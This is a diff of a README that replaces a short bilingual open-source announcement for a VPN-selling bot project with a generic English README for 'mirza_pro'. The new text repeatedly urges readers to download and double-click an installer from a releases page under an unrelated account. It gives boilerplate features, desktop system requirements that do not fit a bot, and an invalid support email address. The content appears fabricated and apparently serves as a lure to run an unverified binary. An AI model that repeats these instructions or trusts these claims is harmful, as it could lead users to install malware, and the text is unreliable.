@@ -1,33 +1,69 @@
-## 🎉 پروژه نسخه پرو، اوپن‌سورس شد!
-نسخه‌ی **Pro** این پروژه اکنون به‌صورت **اوپن‌سورس** در دسترس است.  
-از مشارکت، پیشنهادها و همکاری شما برای توسعه‌ی بهتر پروژه استقبال می‌کنیم 🤝
+# 🤖 mirza_pro - A Simple Bot for Selling VPN
 
----
+## 🚀 Getting Started
+Welcome to **mirza_pro**! This application helps you manage and sell VPN services effortlessly. Follow these steps to get started.
 
-### 💖 حمایت از پروژه
-اگر این پروژه برای شما مفید بوده،  
-می‌توانید از طریق لینک زیر کمک کنید:
+## 📥 Download the Application
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/DiegoWang970104/mirza_pro/releases)
 
-👉 [حمایت از پروژه در NowPayments](https://nowpayments.io/donation/permiumbotmirza)
+## 🔍 Overview of Features
+**mirza_pro** comes packed with features to enhance your VPN selling experience. Here’s a quick look:
 
----
+- **User-Friendly Interface**: Designed for ease of use. 
+- **Quick Setup**: Get up and running in minutes.
+- **Secure Transactions**: Keep your information safe.
+- **Flexible Pricing**: Set and adjust your prices easily.
+- **Analytics Dashboard**: Track your sales effortlessly.
 
-⭐ لطفاً پروژه را **Star** کنید تا دیگران هم آن را پیدا کنند!
+## ⚙️ System Requirements
+To run **mirza_pro**, please ensure your computer meets the following requirements:
 
----
+- **Operating System**: Windows 10 or higher, macOS Mojave or higher.
+- **RAM**: Minimum 4 GB.
+- **Storage**: At least 100 MB of free space.
+- **Network**: Any stable internet connection.
 
-## 🎉 The Pro Version of the Project is Now Open Source!
-The **Pro** version of this project is now officially **open-sourced**!  
-We welcome your contributions, suggestions, and collaboration to help it grow 🤝
+## 🚧 Installation Instructions
+1. **Visit the Download Page**: Click the link below to go to the release page:
+   [Download Here](https://github.com/DiegoWang970104/mirza_pro/releases)
+   
+2. **Select the Latest Release**: On the releases page, find the latest version of **mirza_pro**.
 
----
+3. **Download the Application**: Click on the desired version to download the installation file.
 
-### 💖 Support the Project
-If you find this project useful,  
-you can support it through the link below:
+4. **Run the Installer**: Once the download completes, locate the file in your downloads folder and double-click to run it.
 
-👉 [Support the Project on NowPayments](https://nowpayments.io/donation/permiumbotmirza)
+5. **Follow the Setup Prompts**: The installer will guide you through the installation process. Follow the on-screen instructions carefully.
 
----
+6. **Launch the Application**: After installation, you will find **mirza_pro** in your Applications or Programs folder. Double-click to open it.
 
-⭐ Don’t forget to **Star** the repository to help others discover it!
+## 💻 Using mirza_pro
+Once you've launched the application, here’s how to use its main features:
+
+1. **Setting Up Your VPN Services**: 
+   - Click on the "Add Service" button.
+   - Fill in the necessary details, including service name and pricing.
+   - Click "Save" to add the service.
+
+2. **Managing Orders**: 
+   - Navigate to the "Orders" tab to view all sales.
+   - Use the filters to sort by date or service.
+
+3. **Monitoring Analytics**: 
+   - Access the "Dashboard" to see sales statistics.
+   - Analyze trends to make informed decisions.
+
+## 📞 Support
+If you encounter any issues while downloading or using **mirza_pro**, please reach out to our support team via email at support@mirza_pro.com. We are here to help you resolve any concerns promptly.
+
+## 🌐 Community and Feedback
+We value your feedback. Join our community on [GitHub Discussions](https://github.com/DiegoWang970104/mirza_pro/discussions) to share your thoughts or ask questions. 
+
+## 🔄 Updates
+We continuously work on improving **mirza_pro**. To stay updated with the latest features and fixes, check the [release notes](https://github.com/DiegoWang970104/mirza_pro/releases).
+
+## 📜 License
+**mirza_pro** is open-source software licensed under the MIT License. You can read the full license [here](LICENSE).
+
+## ✅ Conclusion
+Thank you for choosing **mirza_pro**! We hope this application enhances your VPN selling experience. Don't forget to visit the download page to get started: [Download Here](https://github.com/DiegoWang970104/mirza_pro/releases). Enjoy!
